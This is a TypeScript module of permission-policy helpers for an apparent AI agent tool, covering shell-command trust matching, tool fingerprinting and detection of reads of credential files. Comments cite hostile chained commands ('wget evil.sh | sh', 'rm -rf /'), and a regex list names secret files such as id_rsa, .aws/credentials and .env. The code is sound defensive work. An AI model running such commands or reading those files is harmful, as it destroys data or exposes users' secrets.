/**
 * Pure helpers for permission policy evaluation — trust-pattern matching,
 * tool fingerprinting, and sensitive-read detection.
 *
 * Extracted from permission-policy.ts. No class state, no I/O.
 */
import type { Tool } from '../types/tool.js';
import { matchAny, matchAnyCommand } from '../utils/glob-match.js';
import { subjectForToolInput } from '../utils/tool-subject.js';
import { hasCapability, ToolCapabilities } from './capabilities.js';
import { getInputString } from './yolo-risk.js';

/**
 * Match a computed subject against stored trust patterns.
 *
 * Exact string equality is checked FIRST, before glob compilation. Subjects are
 * glob-escaped at the source (`escapeGlobSubject` turns `* ? [ ]` into `\* \? \[
 * \]`), and a stored "always"-trust pattern is just a prior subject — so for an
 * identical command the pattern and the subject are byte-for-byte equal. The
 * glob matcher alone could not confirm that: `compileGlob` does not treat a
 * backslash as an escape outside character classes, so an escaped `\[`/`\]` is
 * parsed as a character-class delimiter and a command like `[ -f x ]` or
 * `grep "[0-9]"` never re-matched its own trust entry — re-prompting forever
 * even after the user chose "always" (#15). Exact equality is also strictly
 * tighter than a glob, so this never widens what a pattern authorizes; genuine
 * wildcard patterns (e.g. a user-authored `git *`) still fall through to glob.
 */
export function matchesTrust(patterns: string[], subject: string): boolean {
  return patterns.includes(subject) || matchAny(patterns, subject);
}

/**
 * Match a trust pattern against a shell command line, for ALLOW decisions only
 * (WS-047).
 *
 * `matchesTrust` compiles `*` to `[^/]*`, which crosses `;`, `&` and `|`. On a
 * path that is right; on a command it means a user who wrote `git *` also
 * authorized `git status; wget evil.sh | sh`. `matchAnyCommand` stops the
 * wildcard at shell separators, so the pattern authorizes what it appears to.
 *
 * DELIBERATELY NOT used for deny. This matcher is strictly narrower, and
 * narrowing a deny pattern un-blocks whatever falls outside it: a deny of
 * `git *` must keep matching `git status; rm -rf /`, because the user's intent
 * there is "no git-shaped command gets through", not "only well-formed ones".
 * Narrower is safer for allow and more dangerous for deny — hence two call
 * sites with two matchers rather than one shared helper that picks.
 *
 * Exact equality is kept first for the same reason as `matchesTrust`: a stored
 * "always" pattern is a prior subject, and glob-escaped brackets do not
 * round-trip through the compiler (#15).
 */
export function matchesCommandTrust(patterns: string[], subject: string): boolean {
  return patterns.includes(subject) || matchAnyCommand(patterns, subject);
}

/**
 * True when this tool's permission subject is a shell command line rather than
 * a path, url, or name — i.e. when the stricter wildcard rules apply.
 */
export function hasShellSubject(tool: Tool): boolean {
  return (
    tool.name === 'bash' ||
    tool.name === 'shell' ||
    tool.name === 'exec' ||
    hasCapability(tool, [
      ToolCapabilities.SHELL_ARBITRARY,
      ToolCapabilities.SHELL_RESTRICTED,
      ToolCapabilities.SHELL_EXEC,
    ])
  );
}

/**
 * Reason a persistent "always allow" cannot be recorded for this call, or
 * `undefined` when it can (WS-046).
 *
 * A stored trust pattern is only ever consulted as
 * `entry.allow && subject && matchesTrust(entry.allow, subject)`. When the tool
 * produces no subject, that condition can never be true — so `trust()` with the
 * fallback `pattern: tool.name` writes an entry that is dead on arrival.
 *
 * The user experience of that bug is the damaging part. They pick "always
 * allow", are asked again on the very next identical call, conclude the feature
 * is broken, and reach for the one thing that does work: a blanket
 * `{"exec": {"auto": true}}`. A silent no-op does not just fail to help — it
 * actively trains people into the widest possible grant.
 *
 * So the option is refused with a stated reason instead of accepted and
 * discarded. Exported so a UI can hide the choice rather than offer one that
 * cannot be honoured.
 */
export function alwaysAllowUnavailableReason(tool: Tool, input: unknown): string | undefined {
  const subject = subjectForToolInput(tool.name, input, tool.subjectKey);
  if (subject !== undefined) return undefined;
  return (
    `"always allow" needs a subject to remember, and ${tool.name} calls do not carry one ` +
    `(no subjectKey, and no path/url/name input). Recording it would store a rule that can ` +
    `never match. Approve this call, or set a trust rule for ${tool.name} explicitly.`
  );
}

/**
 * Fingerprint of the tool fields a permission decision actually depends on
 * (WS-058).
 *
 * The eval cache was keyed on tool NAME plus subject, so a cached verdict
 * outlived the tool definition it was computed from. `ToolRegistry.wrap()`
 * replaces a tool in place and is reachable from the plugin API, so a tool
 * tightened to `permission: 'deny'` mid-session would keep being served the
 * `auto` decided under its previous definition. The cache check also runs
 * BEFORE the tool-default-deny branch, so nothing downstream re-checked.
 *
 * Including these fields in the key means a redefined tool misses the cache
 * and is re-evaluated, rather than inheriting a verdict that no longer
 * describes it. Capabilities are included because the dangerous-capability
 * branches read them; they are short, sorted lists. The tuple is
 * JSON-serialized so separators inside a field value (e.g. a `,` or `|`
 * in a capability string) cannot collide with the delimiters between
 * fields.
 */
export function permissionFingerprint(tool: Tool): string {
  const caps = [...(tool.capabilities ?? [])].sort();
  return JSON.stringify([
    tool.permission ?? '',
    tool.riskTier ?? '',
    tool.mutating ? 'm' : '',
    caps,
  ]);
}

export function shellCommandLineFromInput(input: unknown): string | undefined {
  const command =
    getInputString(input, 'command') ??
    getInputString(input, 'cmd') ??
    getInputString(input, 'script');
  if (!command) return undefined;
  if (!input || typeof input !== 'object') return command;
  const args = (input as Record<string, unknown>)['args'];
  if (!Array.isArray(args) || args.length === 0) return command;
  const renderedArgs = args
    .filter((arg): arg is string => typeof arg === 'string')
    .map((arg) => (/\s/.test(arg) ? `"${arg.replace(/"/g, '\\"')}"` : arg));
  return [command, ...renderedArgs].join(' ');
}

// ── Sensitive-read detection ─────────────────────────────────────────────

const SENSITIVE_READ_PATHS: RegExp[] = [
  /(?:^|[\\/])\.env(?:[.\w-]*)?$/i,
  /(?:^|[\\/])\.npmrc$/i,
  /(?:^|[\\/])\.pypirc$/i,
  /(?:^|[\\/])\.netrc$/i,
  /(?:^|[\\/])id_(?:rsa|dsa|ecdsa|ed25519)$/i,
  /(?:^|[\\/])\.aws[\\/]credentials$/i,
  /(?:^|[\\/])\.kube[\\/]config$/i,
  /(?:^|[\\/])(?:secrets?|tokens?|credentials?|private[_-]?keys?)$/i,
  /(?:^|[\\/])[^\\/]*(?:secret|token|credential|private[_-]?key)[^\\/]*(?:\.json|\.ya?ml|\.toml|\.ini|\.txt|\.env|\.properties|\.key|\.pem)$/i,
];

const SHELL_READ_VERBS = new Set([
  'cat',
  'type',
  'get-content',
  'gc',
  'more',
  'less',
  'head',
  'tail',
  'grep',
  'rg',
  'sed',
  'awk',
  'findstr',
  'select-string',
  'strings',
  'cp',
  'copy',
  'scp',
]);

function stripShellQuotes(value: string): string {
  return value.replace(/^['"]|['"]$/g, '');
}

function pathLooksSensitive(rawPath: string): boolean {
  const normalized = stripShellQuotes(rawPath).replace(/\\/g, '/');
  return SENSITIVE_READ_PATHS.some((pattern) => pattern.test(normalized));
}

export function inputPathLooksSensitive(input: unknown): boolean {
  if (!input || typeof input !== 'object') return false;
  const obj = input as Record<string, unknown>;
  for (const key of ['path', 'file', 'file_path', 'filePath', 'target', 'targetPath']) {
    const value = obj[key];
    if (typeof value === 'string' && pathLooksSensitive(value)) return true;
  }
  return false;
}

export function shellCommandReadsSensitivePath(command: string): boolean {
  const tokens =
    command.match(/"[^"]*"|'[^']*'|\S+/g)?.map((token) => stripShellQuotes(token).toLowerCase()) ??
    [];
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];
    if (!token) continue;
    if (!SHELL_READ_VERBS.has(token)) continue;
    const rest = tokens.slice(i + 1);
    if (rest.some((arg) => pathLooksSensitive(arg))) return true;
  }
  return false;
}
